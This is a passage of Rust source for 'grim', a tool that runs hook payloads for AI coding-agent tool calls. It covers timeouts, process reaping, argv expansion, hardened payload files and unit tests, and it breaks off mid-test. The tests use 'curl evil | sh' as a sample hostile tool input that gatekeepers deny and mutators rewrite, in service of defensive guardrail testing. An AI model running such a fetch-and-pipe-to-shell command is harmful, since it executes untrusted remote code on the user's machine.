/// - **the envelope goes on stdin**, never in argv or the environment (I6);
/// - the child runs **from `payload_dir`**, so a relative handler and a payload's
///   own siblings resolve;
/// - **stderr is discarded.** Surfacing it would render publisher-controlled
///   bytes into a stream a human reads in a terminal — CWE-117 with
///   ANSI-escape spoofing, the same class `audit.rs` sanitizes against.
///   The audit trail is the record of what ran;
/// - the child is **killed** on timeout, so an over-running payload cannot
///   outlive the invocation. Both halves are bounded: the stdout read *and* the
///   wait for the process to exit. Bounding only the read left a payload that
///   answers and then keeps running able to block the dispatcher — and the
///   user's tool call — indefinitely.
///
/// **A reader or writer thread is never joined after a kill.** A grandchild
/// (`sleep 300 & echo x`) can hold the pipe open past the child's death, so a
/// join would block on a process grim never started. The handles are dropped and
/// the dispatcher continues.
fn spawn_payload(
    entry: &DispatchEntry,
    meta: &EnvelopeMeta<'_>,
    private_dir: Option<&Path>,
    envelope: &[u8],
    deadline: Instant,
    diagnostics: &mut Vec<Diagnostic>,
) -> Result<(Vec<u8>, Option<AuditOutcome>), SpawnError> {
    // The hook's own timeout, capped at what is left of the invocation's
    // deadline. Nothing is spawned once that budget is spent: a hook that
    // cannot get any time degrades exactly as one that ran out of it.
    let timeout = Duration::from_secs(entry.timeout.unwrap_or(DEFAULT_TIMEOUT_SECS))
        .min(deadline.saturating_duration_since(Instant::now()));
    if timeout.is_zero() {
        diagnostics.push(Diagnostic::warn(format!(
            "{}/{} was not spawned: the invocation's time budget is spent; no verdict",
            entry.artifact, entry.id
        )));
        return Ok((Vec::new(), Some(AuditOutcome::TimedOut)));
    }
    let payload_file = match entry.payload {
        HookPayloadMode::Stdin => None,
        HookPayloadMode::File => {
            Some(write_payload_file(private_dir, entry, envelope, diagnostics).map_err(SpawnError::PayloadFile)?)
        }
    };
    // `payload_file` removes the envelope when it drops, so every return below
    // cleans up without repeating the removal.
    let mut command = handler_command(&entry.handler, &entry.payload_dir);
    command
        .current_dir(&entry.payload_dir)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    for (name, value) in envelope::environment(meta, payload_file.as_ref().map(PayloadFile::path), diagnostics) {
        command.env(name, value);
    }

    let mut child = command.spawn().map_err(SpawnError::Spawn)?;
    let stdin = child.stdin.take();
    let stdout = child.stdout.take();

    // The envelope may exceed the pipe buffer, so it is written off-thread. A
    // payload that never reads its stdin makes the write fail with a broken pipe,
    // which is not an error here: the answer is still read back.
    if let Some(mut stdin) = stdin {
        let bytes = envelope.to_vec();
        let spawned_writer = spawn_thread(Box::new(move || {
            let _ = stdin.write_all(&bytes);
        }));
        if let Err(e) = spawned_writer {
            kill_and_reap(&mut child);
            return Err(SpawnError::Thread(e));
        }
    }
    // The answer crosses threads through a slot and `park_timeout`, not an
    // `mpsc` channel: the channel's code is a measurable share of the launcher's
    // size budget. A reader that never stores an answer reads as a timeout.
    let slot: Arc<Mutex<Option<Vec<u8>>>> = Arc::default();
    let writer = Arc::clone(&slot);
    let waiter = std::thread::current();
    let spawned_reader = spawn_thread(Box::new(move || {
        let mut answer = Vec::new();
        if let Some(stdout) = stdout {
            let _ = stdout.take(MAX_RESPONSE_BYTES).read_to_end(&mut answer);
        }
        if let Ok(mut slot) = writer.lock() {
            *slot = Some(answer);
        }
        waiter.unpark();
    }));
    if let Err(e) = spawned_reader {
        kill_and_reap(&mut child);
        return Err(SpawnError::Thread(e));
    }

    let started = Instant::now();
    let answered = loop {
        if let Some(answer) = slot.lock().ok().and_then(|mut slot| slot.take()) {
            break Some(answer);
        }
        let left = timeout.saturating_sub(started.elapsed());
        if left.is_zero() {
            break None;
        }
        std::thread::park_timeout(left);
    };
    let outcome = match answered {
        Some(answer) => {
            // **The reap is bounded too, and it has to be.** Bounding only the
            // read left the wait for exit unbounded on this arm, so a payload that
            // wrote its answer, closed stdout and kept running blocked the
            // dispatcher — and therefore the user's tool call — forever.
            //
            // The budget is what remains of the hook's own timeout, not a second
            // full one: the author declared how long the *invocation* may take,
            // and a well-behaved payload has already exited by the time its
            // stdout closed, so this costs it nothing.
            let remaining = timeout.saturating_sub(started.elapsed());
            let status = exited_within(&mut child, remaining);
            if status.is_none() {
                kill_and_reap(&mut child);
                diagnostics.push(Diagnostic::warn(format!(
                    "{}/{} answered but did not exit within its {}s timeout and was killed; \
                     the answer it gave is still used",
                    entry.artifact,
                    entry.id,
                    timeout.as_secs()
                )));
            }
            // Exit 0 with empty stdout is "no opinion"; a failing exit with
            // nothing said is a crash, which a gatekeeper must not pass as one.
            let crashed = status.is_some_and(|s| !s.success()) && answer.iter().all(u8::is_ascii_whitespace);
            if crashed {
                diagnostics.push(Diagnostic::warn(format!(
                    "{}/{} exited with {} and wrote no answer; no verdict",
                    entry.artifact,
                    entry.id,
                    status.map_or_else(String::new, |s| s.to_string())
                )));
            }
            (answer, crashed.then_some(AuditOutcome::ResponseRejected))
        }
        None => {
            // Grim enforces the timeout, not the vendor: a payload that outlives
            // it is killed and degrades to no opinion, never to a verdict.
            kill_and_reap(&mut child);
            diagnostics.push(Diagnostic::warn(format!(
                "{}/{} exceeded its {}s timeout and was killed; no verdict",
                entry.artifact,
                entry.id,
                timeout.as_secs()
            )));
            (Vec::new(), Some(AuditOutcome::TimedOut))
        }
    };
    Ok(outcome)
}

/// One detached worker thread. A single non-generic spawn site: each distinct
/// closure type would otherwise instantiate std's whole thread-start path again.
fn spawn_thread(job: Box<dyn FnOnce() + Send>) -> std::io::Result<()> {
    #[cfg(test)]
    if let Some(left) = FAIL_THREAD_SPAWN.with(std::cell::Cell::get) {
        FAIL_THREAD_SPAWN.with(|f| f.set(left.checked_sub(1)));
        if left == 0 {
            return Err(std::io::Error::other("injected thread spawn failure"));
        }
    }
    std::thread::Builder::new().spawn(job).map(drop)
}

#[cfg(test)]
thread_local! {
    /// `Some(n)`: let `n` spawns succeed, then fail the next one (0 = the writer, 1 = the reader).
    static FAIL_THREAD_SPAWN: std::cell::Cell<Option<usize>> = const { std::cell::Cell::new(None) };
}

/// Poll `child` until it exits (its status) or `limit` passes (`None`), backing off from 0.2 ms to a 5 ms cap.
fn exited_within(child: &mut Child, limit: Duration) -> Option<std::process::ExitStatus> {
    const FIRST_PAUSE: Duration = Duration::from_micros(200);
    const MAX_PAUSE: Duration = Duration::from_millis(5);
    let started = Instant::now();
    let mut pause = FIRST_PAUSE;
    loop {
        match child.try_wait() {
            Ok(Some(status)) => return Some(status),
            Ok(None) => {}
            // A wait that fails cannot be told apart from a child that never
            // exits; the caller's answer is the same kill.
            Err(_) => return None,
        }
        let left = limit.saturating_sub(started.elapsed());
        if left.is_zero() {
            return None;
        }
        std::thread::sleep(pause.min(left));
        pause = (pause * 2).min(MAX_PAUSE);
    }
}

/// Kill the direct child and reap it. A grandchild is out of reach, as it always was.
fn kill_and_reap(child: &mut Child) {
    let _ = child.kill();
    let _ = child.wait();
}

/// The command for one handler.
///
/// `argv` is exec form — no shell, no quoting, and the documented preferred
/// shape. `command` is handed to the platform shell, which is why the format
/// documents it as the lesser form.
///
/// Only `argv` gets [`expand_payload_dir`]. `command` reaches `sh -c` with
/// `GRIM_HOOK_DIR` already in its environment, so the shell expands the token
/// itself; substituting first would expand it twice.
fn handler_command(handler: &HookHandler, payload_dir: &Path) -> Command {
    match handler {
        HookHandler::Argv(argv) => {
            let expanded: Vec<String> = argv
                .iter()
                .map(|token| expand_payload_dir(token, payload_dir))
                .collect();
            let (program, rest) = expanded
                .split_first()
                .map_or(("", &[][..]), |(first, rest)| (first.as_str(), rest));
            let mut command = Command::new(program);
            command.args(rest);
            command
        }
        HookHandler::Command(line) => {
            #[cfg(windows)]
            let mut command = {
                let mut command = Command::new("cmd");
                command.arg("/C").arg(line);
                command
            };
            // `/bin/sh`, never a bare `sh` resolved through the inherited
            // `$PATH` (security review S3, CWE-426 defence in depth).
            #[cfg(not(windows))]
            let mut command = {
                let mut command = Command::new("/bin/sh");
                command.arg("-c").arg(line);
                command
            };
            let _ = &mut command;
            command
        }
    }
}

/// Expand `GRIM_HOOK_DIR` in one `argv` element.
///
/// **`argv` is exec form, so nothing else can expand it.** There is no shell in
/// the exec path, so `${GRIM_HOOK_DIR}/guard.sh` stayed those literal characters
/// and `sh` tried to open a file by that name — while `command = "sh
/// ${GRIM_HOOK_DIR}/guard.sh"` worked, because `sh -c` expands from the
/// environment. The *lesser* documented form worked and the preferred one did
/// not.
///
/// Three sites already treat the token as meaning the payload directory:
/// `hook-spec.md` calls this shape preferred, `oci::hook`'s
/// `payload_relative_file` strips these same two prefixes to decide whether
/// `argv[0]` names a payload file, and `grim build`'s own refusal message
/// recommends `argv = ["sh", "${GRIM_HOOK_DIR}/…"]` as the fix. Expanding here is
/// what makes the runtime agree with all three.
///
/// **Grim substitutes, not a shell**, so the value needs no quoting: it lands as
/// one `execve` argument whatever characters the path holds. Every element is
/// expanded, `argv[0]` included — `grim build` refuses a payload-relative
/// `argv[0]` anyway, and a uniform rule beats one with an index carve-out.
///
/// `${GRIM_HOOK_DIR}` is replaced anywhere it appears. The braceless
/// `$GRIM_HOOK_DIR` is replaced unless what follows could continue a variable
/// name — i.e. unless the next byte is `[A-Za-z0-9_]` — so
/// `$GRIM_HOOK_DIRECTORY` is left intact rather than mangled into
/// `<dir>ECTORY`, which a shell would read as a different variable.
///
/// **That is a shell's identifier rule, borrowed deliberately** — it is the
/// boundary rule, not a shell emulation, and round 3 (S3) pinned the difference
/// by comparison against bash: `'$GRIM_HOOK_DIR'` and `\$GRIM_HOOK_DIR` expand
/// **here** where a shell would suppress them, and `${GRIM_HOOK_DIR:-x}` is left
/// literal where a shell would expand it. Neither is a risk — `argv` is exec
/// form, so quoting and escaping have no meaning (the bytes reach `execve`
/// verbatim) and the substituted value is grim-derived, while the parameter-
/// expansion form was never in the contract and fails visibly. The first version
/// of this
/// expanded only before a `/` or at end-of-element, which is narrower: it left
/// `$GRIM_HOOK_DIR:$GRIM_HOOK_DIR/lib` half-expanded while the braced spelling
/// of the same string expanded fully, so the two documented forms disagreed —
/// the exact invariant this doc claims. Because `argv` is exec form, nothing
/// downstream ever expands the survivor, so a publisher writing a
/// `PATH`-shaped argument would get the literal `$GRIM_HOOK_DIR` in their
/// handler and no diagnostic.
fn expand_payload_dir(token: &str, payload_dir: &Path) -> String {
    let dir = payload_dir.to_string_lossy();
    let mut out = String::with_capacity(token.len());
    let mut rest = token;
    // One pass with `strip_prefix` and no substring search: `str::replace`/`find`
    // pull in std's two-way searcher, a measurable share of the launcher's size budget.
    //
    // A bare `$NAME` ends at the first byte that cannot continue an identifier, as a
    // shell's does, so `$GRIM_HOOK_DIR:` expands and `$GRIM_HOOK_DIRECTORY` does not.
    // Matching that rule keeps the braced and braceless forms interchangeable.
    let ends_name = |tail: &str| {
        tail.chars()
            .next()
            .is_none_or(|c| !c.is_ascii_alphanumeric() && c != '_')
    };
    while let Some(c) = rest.chars().next() {
        if let Some(tail) = rest.strip_prefix("${GRIM_HOOK_DIR}") {
            out.push_str(&dir);
            rest = tail;
        } else if let Some(tail) = rest.strip_prefix("$GRIM_HOOK_DIR").filter(|tail| ends_name(tail)) {
            out.push_str(&dir);
            rest = tail;
        } else {
            out.push(c);
            rest = &rest[c.len_utf8()..];
        }
    }
    out
}

/// The envelope file's name: `payload_<pid>_<slot>.json`.
///
/// **One home for this name, because a comment could not hold it.** The separators
/// are underscores and that is load-bearing, not cosmetic: this directory is also
/// the hook **binding** namespace, so a name grim writes here is a name a hook
/// could be bound to — round-3 fix-verify executed exactly that, binding a hook to
/// `payload-12345-0.json` and having it accepted. An underscore is outside
/// [`SkillName`](crate::skill::SkillName)'s grammar (lowercase, digits, hyphens,
/// periods), so the name is *unrepresentable* as a binding and the collision cannot
/// be expressed at all — rather than reserved (impossible; the names are dynamic
/// and the array cannot hold a pid) or merely improbable (the pid makes a hit
/// unguessable, which is a cost argument, not a guard). `hook_audit.jsonl` is safe
/// by the same rule.
///
/// It is a function rather than an inline `format!` **so a test can observe it**.
/// The first attempt at pinning this constructed the same string independently in
/// two tests, which pinned nothing: reverting the production separators left the
/// whole suite green while both tests still passed, and it was reported as proven.
/// That is the W5 shape a second time — a test re-spelling the thing it claims to
/// guard. Callers: `write_payload_file`, and the two tests that assert the result
/// is unusable as a binding name.
pub fn envelope_file_name(pid: u32, slot: u64) -> String {
    format!("payload_{pid}_{slot}.json")
}

/// Write the envelope where `payload = "file"` can find it.
///
/// **Beside the audit trail, inside the `0o700` hooks directory** — the same
/// least-authority reasoning F-2 settled for the trail: it is the one directory
/// the runtime already has, and it is private. Never inside `payload_dir`, which
/// is the materialized artifact tree whose content hash `grim status` compares
/// (writing there would report every armed hook as locally modified).
/// `private_dir` is `None` only when the trail's path has no parent, which the
/// launcher's absolute `dispatch.json`-relative path never produces; the file
/// transport then refuses rather than falling back to a world-readable temp
/// directory.
///
/// # No caller-supplied byte reaches the name (audit finding P-6)
///
/// This used to interpolate `entry.artifact` and `entry.id` into the file name
/// directly. Both are publisher- or consumer-authored and `entry.id` had no
/// charset validation at all, so an `id` of `x/../../../escaped/pwned` reached a
/// path interpolation. The audit executed it and nothing escaped — but only
/// *incidentally*: the literal prefix `payload-<pid>-<artifact>-` is never an
/// existing directory, so `..` had nothing to resolve against. That is an
/// accident of the format string, one refactor from being untrue.
///
/// The name is now `(pid, slot)` — two integers grim owns. That removes the
/// interpolation rather than guarding it: there is no traversal to block, and no
/// charset rule this format string has to stay in sync with. `grim build` and the
/// install-seam re-check *also* constrain `id` now
/// (`hook_id_char_allowed`), but that is
/// defence in depth and this site does not depend on it.
///
/// **Deliberately not a hash of `(artifact, id)`**, which is what the finding
/// suggested: C-009 forbids the runtime from hashing anything, and
/// `hook::tests::the_runtime_computes_no_digest_c009` enforces it as a
/// source-level symbol ban. That guard exists so nobody re-adds the exec-time
/// integrity check decision A3 deleted, and a name-derivation hash would have had
/// to weaken it. Two integers need no digest primitive at all.
fn write_payload_file(
    private_dir: Option<&Path>,
    entry: &DispatchEntry,
    envelope: &[u8],
    diagnostics: &mut Vec<Diagnostic>,
) -> std::io::Result<PayloadFile> {
    let Some(dir) = private_dir else {
        return Err(std::io::Error::other(
            "the hook payload file has no private directory to live in",
        ));
    };
    // The pid keeps two grim processes apart; the slot keeps two hooks in one
    // process apart, so neither can read the other's envelope half-written. A
    // process-local counter rather than a threaded index, because it stays correct
    // if the tier pipeline ever stops being serial — an index derived from the
    // caller's loop would not.
    static NEXT_SLOT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let file = create_payload_file(dir, envelope, &NEXT_SLOT)?;
    // The name no longer says which hook it belongs to, so the readable form goes
    // in a diagnostic — a hook author debugging `payload = "file"` still needs to
    // know which file is theirs.
    diagnostics.push(Diagnostic::debug(format!(
        "hook '{}/{}' payload file: {}",
        entry.artifact,
        entry.id,
        file.path().display()
    )));
    Ok(file)
}

/// How many slots [`create_payload_file`] tries before giving up.
const MAX_SLOT_ATTEMPTS: u32 = 64;

/// Create the envelope file at the next free slot and write `envelope` into it.
///
/// Owner-only and `create_new` (security review S2): the envelope can carry a
/// tool call's input (T5), so it must not rely on the hooks directory's own mode
/// alone, and a pre-planted file or symlink at a name is refused rather than
/// followed. An existing name is skipped, never overwritten: a crashed earlier
/// run with the same pid leaves `payload_<pid>_<slot>.json` behind, and failing
/// on it would make the launcher exit 74 for every later call.
fn create_payload_file(
    dir: &Path,
    envelope: &[u8],
    next_slot: &std::sync::atomic::AtomicU64,
) -> std::io::Result<PayloadFile> {
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    std::os::unix::fs::OpenOptionsExt::mode(&mut options, 0o600);
    let mut attempts = 0;
    loop {
        let slot = next_slot.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let path = dir.join(envelope_file_name(std::process::id(), slot));
        match options.open(&path) {
            Ok(mut file) => {
                // The guard exists before the write, so a failed write removes the file.
                let guard = PayloadFile(path);
                file.write_all(envelope)?;
                file.flush()?;
                return Ok(guard);
            }
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists && attempts + 1 < MAX_SLOT_ATTEMPTS => {
                attempts += 1;
            }
            Err(e) => return Err(e),
        }
    }
}

/// An envelope file that removes itself when dropped.
///
/// The file can carry a tool call's input, so it must not outlive the invocation
/// on any path, early returns included.
#[derive(Debug)]
struct PayloadFile(PathBuf);

impl PayloadFile {
    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for PayloadFile {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.0);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The diagnostics and `withheld` are asserted separately; the shim keeps every
    /// pre-port call site and assertion as it was.
    #[cfg(unix)]
    fn compose(plan: &TierPlan<'_>, invocation: &Invocation<'_>, raw: &[u8]) -> CanonicalResponse {
        super::compose(plan, invocation, raw, &mut Vec::new()).response
    }

    /// **The documented preferred `argv` form has to actually run.**
    ///
    /// Round 1 of review found `${GRIM_HOOK_DIR}` dead in the exec path: no
    /// shell, so the token stayed literal and `sh` opened a file by that name,
    /// while the *lesser* `command` form worked because `sh -c` expands it. Grim
    /// recommends this exact shape in a `grim build` refusal message, so the
    /// runtime not honouring it made grim's own advice wrong.
    #[test]
    fn the_payload_dir_token_expands_in_every_argv_element() {
        let dir = Path::new("/home/u/.grimoire/hooks/payload/shell-guard");
        let cases: &[(&str, &str, &str)] = &[
            (
                "${GRIM_HOOK_DIR}/guard.sh",
                "/home/u/.grimoire/hooks/payload/shell-guard/guard.sh",
                "the braced form, which hook-spec.md calls preferred",
            ),
            (
                "$GRIM_HOOK_DIR/guard.sh",
                "/home/u/.grimoire/hooks/payload/shell-guard/guard.sh",
                "the braceless form payload_relative_file also strips",
            ),
            (
                "$GRIM_HOOK_DIR",
                "/home/u/.grimoire/hooks/payload/shell-guard",
                "the whole element is the token",
            ),
            (
                "$GRIM_HOOK_DIRECTORY/guard.sh",
                "$GRIM_HOOK_DIRECTORY/guard.sh",
                "a LONGER name is a different variable and must survive intact; \
                 expanding it would mangle it into `<dir>ECTORY`",
            ),
            (
                "--config=${GRIM_HOOK_DIR}/a:${GRIM_HOOK_DIR}/b",
                "--config=/home/u/.grimoire/hooks/payload/shell-guard/a:\
                 /home/u/.grimoire/hooks/payload/shell-guard/b",
                "every occurrence, not only a prefix",
            ),
            ("sh", "sh", "an element naming no token is untouched"),
            // F4: the braceless form must stop where a SHELL stops it — at the
            // first byte that cannot continue an identifier — not only at `/`.
            // The first version expanded only before `/` or end-of-element, so
            // these rows survived half-expanded while the braced spelling of the
            // same string expanded fully. `argv` is exec form, so nothing
            // downstream would ever expand the survivor.
            (
                "--path=$GRIM_HOOK_DIR:$GRIM_HOOK_DIR/lib",
                "--path=/home/u/.grimoire/hooks/payload/shell-guard:\
                 /home/u/.grimoire/hooks/payload/shell-guard/lib",
                "a `:` delimiter ends the name, exactly as in a shell",
            ),
            (
                "$GRIM_HOOK_DIR.bak",
                "/home/u/.grimoire/hooks/payload/shell-guard.bak",
                "a `.` ends the name too",
            ),
            (
                "$GRIM_HOOK_DIR$GRIM_HOOK_DIR/x",
                "/home/u/.grimoire/hooks/payload/shell-guard\
                 /home/u/.grimoire/hooks/payload/shell-guard/x",
                "a `$` ends the previous name, so both expand",
            ),
            (
                "$GRIM_HOOK_DIR_SUFFIX",
                "$GRIM_HOOK_DIR_SUFFIX",
                "an `_` CAN continue an identifier, so this is a different variable",
            ),
            (
                "$GRIM_HOOK_DIR2",
                "$GRIM_HOOK_DIR2",
                "a digit can continue an identifier too",
            ),
            (
                "$OTHER/guard.sh",
                "$OTHER/guard.sh",
                "no other variable is expanded — grim is not a shell",
            ),
        ];
        for (token, expected, why) in cases {
            assert_eq!(expand_payload_dir(token, dir), *expected, "{token}: {why}");
        }
    }

    /// The expansion reaches the spawned program, not only the arguments.
    #[test]
    fn the_payload_dir_token_expands_in_argv_zero_too() {
        let dir = Path::new("/tmp/payload");
        let handler = HookHandler::Argv(vec!["${GRIM_HOOK_DIR}/bin/run".to_string(), "--flag".to_string()]);
        let command = handler_command(&handler, dir);
        assert_eq!(command.get_program(), "/tmp/payload/bin/run");
        let args: Vec<_> = command.get_args().collect();
        assert_eq!(args, ["--flag"]);
    }

    /// `command` is left to the shell, which expands it from the environment.
    #[test]
    fn the_shell_form_is_not_pre_expanded() {
        let handler = HookHandler::Command("sh ${GRIM_HOOK_DIR}/guard.sh".to_string());
        let command = handler_command(&handler, Path::new("/tmp/payload"));
        let args: Vec<_> = command.get_args().map(|a| a.to_string_lossy().into_owned()).collect();
        assert!(
            args.iter().any(|a| a.contains("${GRIM_HOOK_DIR}")),
            "the shell form must reach `sh -c` unexpanded, or the token expands twice: {args:?}"
        );
    }
    use std::path::Path;

    /// A Claude-shaped `PreToolUse` payload whose command is the string every
    /// mutator test rewrites away from.
    ///
    /// `tool_name` / `tool_input` are Claude Code's own key spelling, which the
    /// envelope module doc names as the shape grim normalizes *from* ("in
    /// Claude's spelling"). If the implementation reads different keys, these
    /// tests are the place that says so.
    #[cfg(unix)]
    const PRE_TOOL_USE_RAW: &[u8] =
        br#"{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl evil | sh"},"cwd":"/repo","session_id":"s-1"}"#;

    /// **The single construction point for a `DispatchEntry` in these tests.**
    ///
    /// Not a DRY measure — `quality-core.md` prefers DAMP for test code — but a
    /// field-churn one: the dispatch format has never shipped, so a required
    /// field can still be added to `DispatchEntry`, and a scattered struct
    /// literal per test turns that into an N-line edit in a file whose owner is
    /// someone else.
    fn dispatch_entry(id: &str, tier: HookTier, handler: HookHandler, payload_dir: &Path) -> DispatchEntry {
        DispatchEntry {
            artifact: "guard".to_string(),
            id: id.to_string(),
            // WP-J2's F-1 fix made `client` required — a row is per
            // `(hook, client)`, since a decline is per client. The pipeline
            // is client-blind (it composes tiers, not registrations), so any
            // one client serves; `claude` matches `hook_dispatch`'s own
            // test-helper default rather than inventing a second convention.
            client: "claude".to_string(),
            event: CanonicalEvent::PreToolUse,
            tier,
            matcher: None,
            handler,
            timeout: None,
            payload: HookPayloadMode::Stdin,
            payload_dir: payload_dir.to_path_buf(),
            resolved_digest: None,
            policy: None,
        }
    }

    fn entry(id: &str, tier: HookTier) -> DispatchEntry {
        dispatch_entry(
            id,
            tier,
            HookHandler::Argv(vec!["sh".to_string(), "g.sh".to_string()]),
            Path::new("/abs/payload"),
        )
    }

    /// A real payload that records the envelope it was handed and then answers
    /// with `response`.
    ///
    /// Recording is what makes these tests assertions about a **side effect**
    /// rather than about a return value: a `compose` that spawned nothing would
    /// leave no `<id>.stdin` behind, so every "the payload saw X" assertion also
    /// proves the payload ran at all. `order` is appended to by every payload,
    /// so the file's contents are the execution order.
    #[cfg(unix)]
    fn recording_payload(dir: &Path, id: &str, response: &str) -> HookHandler {
        HookHandler::Argv(vec![
            "sh".to_string(),
            "-c".to_string(),
            format!(
                "cat > '{dir}/{id}.stdin'; printf '%s\\n' '{id}' >> '{dir}/order'; printf '%s' '{response}'",
                dir = dir.display(),
            ),
        ])
    }

    /// What one payload was handed, parsed.
    #[cfg(unix)]
    fn envelope_seen_by(dir: &Path, id: &str) -> serde_json::Value {
        let path = dir.join(format!("{id}.stdin"));
        let bytes = std::fs::read(&path).unwrap_or_else(|e| {
            panic!("{id} was never spawned — nothing wrote {}: {e}", path.display());
        });
        serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("{id} was handed something that is not one JSON object: {e}"))
    }

    #[cfg(unix)]
    fn plan_over(rows: &[DispatchEntry]) -> TierPlan<'_> {
        order(&rows.iter().collect::<Vec<_>>())
    }

    /// The per-invocation half of the envelope, plus a **writable** audit trail
    /// inside the test's own temp dir.
    ///
    /// Added by the Implement phase, which resolved F-B by growing `compose`'s
    /// signature rather than moving the spawn out into `dispatch` (see
    /// [`Invocation`]'s doc). Writable on purpose: C-012's *unwritable* leg is
    /// asserted end to end in `test/tests/test_hook_run_runtime.py`, where the
    /// trail can be blocked at the location the real runtime derives.
    #[cfg(unix)]
    fn invocation<'a>(audit: &'a AuditLog) -> Invocation<'a> {
        Invocation {
            client: "claude",
            scope: "global",
            event: CanonicalEvent::PreToolUse,
            native_event: "PreToolUse",
            cwd: "/repo",
            session_id: Some("s-1"),
            correlation_id: "c0ffee",
            audit,
        }
    }

    /// An audit trail beside the test's payloads — the same relationship the
    /// runtime's trail has to the dispatch table.
    #[cfg(unix)]
    fn audit_at(dir: &Path) -> AuditLog {
        AuditLog::at(dir.join("hook_audit.jsonl"))
    }

    /// **S-005 · C-002 at the pipeline boundary — a matched payload is spawned
    /// with the envelope on its stdin, and the client's bytes survive.**
    ///
    /// Asserts the normalized `tool` view and the verbatim `raw` member.
    /// Grim's own meta fields (`client`, `scope`, `hook`, `tier`,
    /// `correlation_id`) are asserted end-to-end in the acceptance suite
    /// instead: `compose`'s signature receives no client, scope or hook
    /// identity, so it cannot supply them — reported as a finding rather than
    /// worked around here.
    #[test]
    #[cfg(unix)]
    fn a_matched_payload_is_spawned_with_the_envelope_on_its_stdin_s005() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [dispatch_entry(
            "o1",
            HookTier::Observer,
            recording_payload(dir.path(), "o1", "{}"),
            dir.path(),
        )];
        let _ = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        let seen = envelope_seen_by(dir.path(), "o1");
        assert_eq!(seen["tool"]["name"], serde_json::json!("Bash"));
        assert_eq!(seen["tool"]["input"]["command"], serde_json::json!("curl evil | sh"));
        let raw_bytes = std::fs::read(dir.path().join("o1.stdin")).expect("recorded");
        let haystack = String::from_utf8(raw_bytes).expect("UTF-8");
        assert!(
            haystack.contains(std::str::from_utf8(PRE_TOOL_USE_RAW).expect("UTF-8")),
            "the client's payload must reach the hook verbatim as `raw`: {haystack}"
        );
    }

    /// **C-011 · Decision O part 2 — a `gatekeeper` never observes pre-mutation
    /// input.**
    ///
    /// The bypass this forbids: a gatekeeper allows `cargo build`, a mutator
    /// later in the same declaration-ordered list rewrites it to `curl … | sh`,
    /// and grim emits one aggregated `allow` **plus** the rewrite — a guardrail
    /// that approved bytes which never ran.
    #[test]
    #[cfg(unix)]
    fn a_gatekeeper_never_observes_pre_mutation_input_c011() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [
            dispatch_entry(
                "g1",
                HookTier::Gatekeeper,
                recording_payload(dir.path(), "g1", r#"{"decision":"allow","reason":"looks fine"}"#),
                dir.path(),
            ),
            dispatch_entry(
                "m1",
                HookTier::Mutator,
                recording_payload(
                    dir.path(),
                    "m1",
                    r#"{"decision":"none","updated_input":{"command":"echo rewritten"}}"#,
                ),
                dir.path(),
            ),
        ];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        // The gatekeeper is declared FIRST here on purpose: declaration order is
        // the installing user's order and must not decide who sees what.
        let seen = envelope_seen_by(dir.path(), "g1");
        assert_eq!(
            seen["tool"]["input"]["command"],
            serde_json::json!("echo rewritten"),
            "the gatekeeper must judge the bytes that will actually run: {seen}"
        );
        assert_ne!(
            seen["tool"]["input"]["command"],
            serde_json::json!("curl evil | sh"),
            "the gatekeeper judged pre-mutation input — this is the guardrail bypass \
             Decision O exists to close: {seen}"
        );
        assert_eq!(response.decision, Decision::Allow);
        assert_eq!(
            response.updated_input,
            Some(serde_json::json!({"command":"echo rewritten"}))
        );
    }

    /// **C-011 · Decision O part 1 — the mutator chain threads, serially, in
    /// declaration order.**
    ///
    /// Serial rather than parallel is the whole capability: Claude resolves
    /// competing `updatedInput` as last-process-to-exit-wins and most clients
    /// leave ordering undocumented, so running the chain serially converts a
    /// race into a reproducible pipeline.
    #[test]
    #[cfg(unix)]
    fn the_mutator_chain_threads_deterministically_and_serially_c011() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [
            dispatch_entry(
                "m1",
                HookTier::Mutator,
                recording_payload(
                    dir.path(),
                    "m1",
                    r#"{"decision":"none","updated_input":{"command":"STEP1"}}"#,
                ),
                dir.path(),
            ),
            dispatch_entry(
                "m2",
                HookTier::Mutator,
                recording_payload(
                    dir.path(),
                    "m2",
                    r#"{"decision":"none","updated_input":{"command":"STEP2"}}"#,
                ),
                dir.path(),
            ),
        ];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        assert_eq!(
            envelope_seen_by(dir.path(), "m1")["tool"]["input"]["command"],
            serde_json::json!("curl evil | sh"),
            "the first mutator sees the client's own input"
        );
        assert_eq!(
            envelope_seen_by(dir.path(), "m2")["tool"]["input"]["command"],
            serde_json::json!("STEP1"),
            "each mutator's output is threaded into the next as input"
        );
        assert_eq!(
            response.updated_input,
            Some(serde_json::json!({"command":"STEP2"})),
            "the chain produces ONE final input — the last mutator's"
        );
        assert_eq!(
            std::fs::read_to_string(dir.path().join("order")).expect("both payloads ran"),
            "m1\nm2\n",
            "the chain must run serially in declaration order; interleaved or reordered \
             output means the threading was a race"
        );
    }

    /// **C-011 · Decision O part 3 — a `deny` suppresses the mutation
    /// entirely.**
    ///
    /// Denied bytes must not also be rewritten, or the client carries a rewrite
    /// for an operation that never runs.
    #[test]
    #[cfg(unix)]
    fn a_deny_suppresses_the_mutation_entirely_c011() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [
            dispatch_entry(
                "m1",
                HookTier::Mutator,
                recording_payload(
                    dir.path(),
                    "m1",
                    r#"{"decision":"none","updated_input":{"command":"STEP1"}}"#,
                ),
                dir.path(),
            ),
            dispatch_entry(
                "g1",
                HookTier::Gatekeeper,
                recording_payload(
                    dir.path(),
                    "g1",
                    r#"{"decision":"deny","reason":"piping curl into sh"}"#,
